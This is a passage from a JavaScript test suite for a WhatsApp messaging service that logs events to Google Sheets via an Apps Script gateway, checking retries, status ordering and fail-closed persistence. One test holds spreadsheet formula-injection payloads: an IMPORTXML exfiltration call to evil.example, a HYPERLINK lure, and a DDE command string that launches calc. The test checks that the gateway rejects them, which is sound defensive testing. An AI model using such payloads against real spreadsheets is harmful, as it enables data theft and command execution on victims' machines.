    assert.equal(vmHarness.sheetsMap.get('MESSAGE_EVENTS').length, 2, 'Only 1 data row in synthetic sheet');
  });

  it('G5-03: Provider-scoped identity through gateway.gs VM isolates Meta and ChatMitra sharing identical raw ID', async () => {
    const rawId = 'vm_shared_999';
    await messageEventRepository.recordMessageEvent({
      customer_id: 'CUST-9175635165',
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: rawId
    });
    await messageEventRepository.recordMessageEvent({
      customer_id: 'CUST-9822011223',
      provider: 'ChatMitra',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'SENT',
      provider_message_id: rawId
    });

    const msgRows = vmHarness.sheetsMap.get('MESSAGE_EVENTS');
    assert.equal(msgRows.length, 3, 'Header + 2 distinct provider rows');
    assert.equal(msgRows[1][0], `MSG_META_${rawId}`);
    assert.equal(msgRows[2][0], `MSG_CHATMITRA_${rawId}`);
  });

  it('G5-04: Status update callback through worker + gateway.gs VM transitions SENT -> DELIVERED -> READ monotonically', async () => {
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'VM Status',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WHATSAPP_INBOUND'
    });
    axios.post = async () => ({ data: { messages: [{ id: 'wamid.vm_status_01' }] } });
    await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'VM Status', text: 'Status', customerId: 'CUST-9175635165' },
      'corr_vm_st'
    );

    for (const [idx, statusStr] of ['delivered', 'read', 'sent'].entries()) {
      const resp = await workerRoute.POST(
        buildWorkerRequest({
          eventId: `META_STATUS_vm_st_${idx}_${statusStr}`,
          eventType: 'STATUS_UPDATE',
          provider: 'Meta',
          correlationId: `CORR-VM-${idx}`,
          data: { msgId: 'wamid.vm_status_01', statusStr }
        })
      );
      assert.equal(resp.status, 200);
    }

    const msgRows = vmHarness.sheetsMap.get('MESSAGE_EVENTS');
    assert.equal(msgRows.length, 2, 'Updated in-place, zero duplicate rows');
    assert.equal(msgRows[1][0], 'MSG_META_wamid.vm_status_01');
    assert.equal(msgRows[1][5], 'READ', 'Out-of-order SENT must not downgrade READ');
  });

  it('G5-05: Invalid gateway response (missing nested data envelope / non-boolean flag) fails closed in Meta persistence', async () => {
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'Bad Env',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WHATSAPP_INBOUND'
    });
    let callIdx = 0;
    globalThis.fetch = async (url, init) => {
      callIdx++;
      const parsedBody = JSON.parse(init.body);
      const cmd = JSON.parse(parsedBody.payloadJson);
      if (cmd.action === 'UPSERT_ROW') {
        // Return malformed flat envelope missing data.created boolean
        return { ok: true, status: 200, json: async () => ({ ok: true, created: 'yes' }) };
      }
      return vmHarness.gatewayFetch(url, init);
    };

    axios.post = async () => ({ data: { messages: [{ id: 'wamid.vm_bad_env' }] } });
    const res = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'Bad Env', text: 'Hello', customerId: 'CUST-9175635165' },
      'corr_vm_bad'
    );

    assert.ok(callIdx >= 2);
    assert.equal(res.success, false);
    assert.equal(res.persisted, false);
    assert.equal(res.persistenceFailed, true);
    assert.equal(res.status, 'PERSISTENCE_FAILED');
  });

  it('G5-06: Explicit gateway failure (ok: false, status 503) fails closed with persistenceFailed=true', async () => {
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'Fail Env',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WHATSAPP_INBOUND'
    });
    globalThis.fetch = async (url, init) => {
      const cmd = JSON.parse(JSON.parse(init.body).payloadJson);
      if (cmd.action === 'UPSERT_ROW') {
        return {
          ok: true,
          status: 200,
          json: async () => ({ ok: false, status: 503, code: 'GOOGLE_SHEETS_UNAVAILABLE', error: 'Lock timeout' })
        };
      }
      return vmHarness.gatewayFetch(url, init);
    };

    axios.post = async () => ({ data: { messages: [{ id: 'wamid.vm_ok_false' }] } });
    const res = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'Fail Env', text: 'Hello', customerId: 'CUST-9175635165' },
      'corr_vm_fail'
    );

    assert.equal(res.success, false);
    assert.equal(res.persisted, false);
    assert.equal(res.persistenceFailed, true);
    assert.equal(res.persistenceErrorCode, 'GOOGLE_SHEETS_UNAVAILABLE');
  });

  it('G5-07: Controlled retry recovers on transient gateway 503 during UPSERT_ROW through gateway.gs VM', async () => {
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'Retry User',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WHATSAPP_INBOUND'
    });
    let upsertAttempts = 0;
    globalThis.fetch = async (url, init) => {
      const cmd = JSON.parse(JSON.parse(init.body).payloadJson);
      if (cmd.action === 'UPSERT_ROW') {
        upsertAttempts++;
        if (upsertAttempts === 1) {
          return { ok: false, status: 503, json: async () => ({ ok: false, error: 'Transient 503' }) };
        }
      }
      return vmHarness.gatewayFetch(url, init);
    };

    axios.post = async () => ({ data: { messages: [{ id: 'wamid.vm_retry_ok' }] } });
    const res = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'Retry User', text: 'Hello', customerId: 'CUST-9175635165' },
      'corr_vm_retry'
    );

    assert.equal(upsertAttempts, 2, 'Should retry transient 503 and succeed on attempt 2');
    assert.equal(res.success, true);
    assert.equal(res.persisted, true);
    assert.equal(vmHarness.sheetsMap.get('MESSAGE_EVENTS').length, 2);
  });

  it('G5-08: End-to-end worker AI auto-reply propagates gateway persistence failure as HTTP 503', async () => {
    let failNextWrites = false;
    globalThis.fetch = async (url, init) => {
      const cmd = JSON.parse(JSON.parse(init.body).payloadJson);
      if (failNextWrites && (cmd.action === 'HEALTH_CHECK' || cmd.action === 'UPSERT_ROW')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({ ok: false, status: 503, code: 'GOOGLE_SHEETS_UNAVAILABLE', error: 'Gateway offline' })
        };
      }
      return vmHarness.gatewayFetch(url, init);
    };

    axios.post = async () => {
      failNextWrites = true;
      return { data: { messages: [{ id: 'wamid.vm_worker_out_fail' }] } };
    };

    const resp = await workerRoute.POST(
      buildWorkerRequest({
        eventId: 'META_INBOUND_vm_worker_fail',
        eventType: 'INBOUND_MESSAGE',
        provider: 'Meta',
        correlationId: 'CORR-VM-WF',
        data: {
          message: { type: 'text', text: { body: 'I want a Business Loan in Pune' }, id: 'wamid.vm_worker_in' },
          fromPhone: AUTH_TEST_PHONE_E164,
          msgId: 'wamid.vm_worker_in',
          profileName: 'VM Business Owner'
        }
      })
    );
    assert.equal(resp.status, 503);
    const data = await resp.json();
    assert.equal(data.success, false);
    assert.equal(data.persisted, false);
    assert.equal(data.error, 'GOOGLE_SHEETS_UNAVAILABLE');
  });

  it('G5-09: Zero MongoDB fallback across APPS_SCRIPT_GATEWAY VM success and failure paths', async () => {
    axios.post = async () => ({ data: { messages: [{ id: 'wamid.vm_no_mongo_1' }] } });
    await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'No Mongo', text: 'Ok', customerId: 'CUST-9175635165' },
      'corr_vm_nm1'
    );

    globalThis.fetch = async () => ({ ok: false, status: 503, json: async () => ({ ok: false, error: 'Down' }) });
    const failRes = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'No Mongo', text: 'Fail', customerId: 'CUST-9175635165' },
      'corr_vm_nm2'
    );
    assert.equal(failRes.success, false);
    assert.equal(mongoAttemptCount, 0, 'Poisoned MongoDB hook must have 0 invocation attempts');
  });

  it('G5-10: Zero PostgreSQL fallback across APPS_SCRIPT_GATEWAY VM success and failure paths', async () => {
    axios.post = async () => ({ data: { messages: [{ id: 'wamid.vm_no_pg_1' }] } });
    await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'No PG', text: 'Ok', customerId: 'CUST-9175635165' },
      'corr_vm_npg1'
    );

    globalThis.fetch = async () => ({ ok: false, status: 503, json: async () => ({ ok: false, error: 'Down' }) });
    const failRes = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'No PG', text: 'Fail', customerId: 'CUST-9175635165' },
      'corr_vm_npg2'
    );
    assert.equal(failRes.success, false);
    assert.equal(postgresAttemptCount, 0, 'Poisoned PostgreSQL hook must have 0 invocation attempts');
  });

  it('G5-11 (Task 5H.33 H-02): Formula injection payloads are rejected fail-closed through gateway.gs VM', async () => {
    // 1. Repository / validation layer blocks formula-injection provider_message_id before gateway call
    await assert.rejects(
      () =>
        messageEventRepository.recordMessageEvent({
          customer_id: 'CUST-9175635165',
          provider: 'Meta',
          message_type: 'TEXT',
          direction: 'outbound',
          delivery_status: 'SENT',
          provider_message_id: '=IMPORTXML("https://evil.example/exfil","//a")'
        }),
      (err) => err instanceof SheetsCrmError && err.code === 'GOOGLE_SHEETS_FORMULA_INJECTION_BLOCKED'
    );

    // 2. Direct HMAC-signed gateway.gs VM execution independently blocks formula-prefixed cells
    const { signAppsScriptGatewayRequest } = require('../src/lib/google-sheets/google-auth.ts');
    const maliciousCommand = {
      action: 'UPSERT_ROW',
      tab: 'MESSAGE_EVENTS',
      rowValues: [
        'MSG_META_vm_formula_01',
        'CUST-9175635165',
        'Meta',
        'TEXT',
        'outbound',
        '=HYPERLINK("https://evil.example","CLICK")',
        '+cmd|\' /C calc\'!A0',
        new Date().toISOString()
      ]
    };
    const signed = signAppsScriptGatewayRequest(maliciousCommand, TEST_GATEWAY_SECRET);
    const vmResp = await vmHarness.gatewayFetch(process.env.GOOGLE_SHEETS_GATEWAY_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: signed.bodyString
    });
    const vmJson = await vmResp.json();
    assert.equal(vmJson.ok, false, 'gateway.gs VM MUST reject formula-injection cell values');
    assert.equal(vmJson.code, 'GOOGLE_SHEETS_FORMULA_INJECTION_BLOCKED');
    assert.equal(vmHarness.sheetsMap.get('MESSAGE_EVENTS').length, 1, 'Zero malicious rows written to MESSAGE_EVENTS');
  });
});
